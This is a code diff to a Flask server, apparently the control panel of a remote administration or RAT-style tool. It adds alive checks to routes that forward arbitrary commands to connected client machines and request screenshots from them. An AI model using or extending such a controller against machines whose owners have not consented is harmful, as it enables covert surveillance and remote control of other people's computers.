@@ -9,6 +9,7 @@ app = Flask(__name__)
 # 路由，用于获取在线客户端列表
 @app.route('/online_clients', methods=['GET'])
 def get_online_clients():
+    check_alive()
     with lock:
         # 返回在线客户端的字典
         client_addresses = {client_uuid: [value[0].getpeername(), value[1]] for client_uuid, value in online_clients.items()}
@@ -36,12 +37,10 @@ def command():
     if not connection_thread.is_alive(): return ''
     client_uuid = request.args.get('uuid', '')
     command = request.args.get('cmd', '')
-    if not client_uuid in online_clients.keys(): return ''
+    if not is_alive(client_uuid): return ''
     client_socket = online_clients[client_uuid][0]
     with client_locks[client_uuid]:
-        Protocol(extension='command').upmeta({
-            'command':command
-        }).create_stream(client_socket.send)
+        Protocol(extension=command).create_stream(client_socket.send)
         response = Protocol().load_stream(client_socket.recv).json
     return str(response)
 
@@ -49,15 +48,13 @@ def command():
 def screenshot():
     if not connection_thread.is_alive(): return ''
     client_uuid = request.args.get('uuid', '')
-    if not client_uuid in online_clients.keys(): return ''
+    if not is_alive(client_uuid): return ''
     client_socket = online_clients[client_uuid][0]
     with client_locks[client_uuid]:
-        Protocol(extension='command').upmeta({
-            'command':'screenshot'
-        }).create_stream(client_socket.send)
+        Protocol(extension='screenshot').create_stream(client_socket.send)
         respond = Protocol().load_stream(client_socket.recv)
         
-    return send_file(respond, mimetype='image/jpeg')
+    return send_file(respond, mimetype='image/png')
 
 @app.route('/')
 def index():
